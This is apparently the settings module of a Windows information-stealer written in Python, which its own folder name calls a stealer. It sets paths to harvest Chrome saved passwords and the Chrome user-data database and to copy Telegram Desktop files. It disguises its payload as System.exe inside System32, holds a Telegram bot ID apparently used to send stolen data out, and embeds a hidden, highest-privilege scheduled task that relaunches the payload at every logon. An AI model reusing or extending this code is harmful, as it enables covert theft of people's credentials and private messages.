from settings_functions import get_fleshdisk
import os
# import time

CODE_FOLDER = 'q7dhw762yd723hdkwqk28'

USER = str(os.getlogin())

# --- DEBUG
DEBUG = False

# --- Create dir for save files

# find dir called CODE_DIR for saving on this disk 
DISK_LITTER = get_fleshdisk(CODE_FOLDER)

# for copy skript in autoload dir on PC
# AUTOLOAD_FILE = f'C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\System.exe'
SKRIPT_FILE = DISK_LITTER + '\\Programs\\System\\System.exe'

# create dir on disk for saving all data in this dir
ROOT_FOLDER = 'C:\\Windows\\System32\\' + CODE_FOLDER
if not DEBUG:
    PROGRAM_NAME = 'System.exe'
    PROGRAM_FOLDER = 'C:\\Windows\\System32\\' + PROGRAM_NAME
else:
    PROGRAM_NAME = 'main.py'
    PROGRAM_FOLDER = 'E:\\python\\мои проекти\\Стиллер инфорации\\version 2.2\\' + PROGRAM_NAME

# --- End create dir for save files


# --- Chrome

CHROME_URL = 'chrome://settings/passwords'
CHROME_DRIVER_PATH_FROM = DISK_LITTER + '\\Programs\\chromedrivers\\chromedriver.exe'
# CHROME_DRIVER_PATH = f'C:\\Windows\\System32\\chromedriver.exe'
CHROME_DRIVER_PATH = f'C:\\Users\\{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\chromedriver.exe'

CHROME_SAVE_FOLDER = ROOT_FOLDER + '\\Chrome'
CHROME_DATABASE_FOLDER = f'C:\\Users\\{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\'


# telebot
TELEBOT_ID = 606199454
TELEGRAM_MAX_WEIGHT = 30 * 1024 ** 2  # 30 mb
TELEGRAM_FOLDER = f"C:\\Users\\{USER}\\Downloads\\Telegram Desktop\\"
TELEGRAM_SAVE_FOLDER = ROOT_FOLDER + '\\telegram'

# --- Autoload
AUTOLOAD_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2022-04-20T22:52:19</Date>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <StartBoundary>2022-04-20T22:52:00</StartBoundary>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>true</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>300</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\\Windows\\System32\\System.exe</Command>
    </Exec>
  </Actions>
</Task>
"""
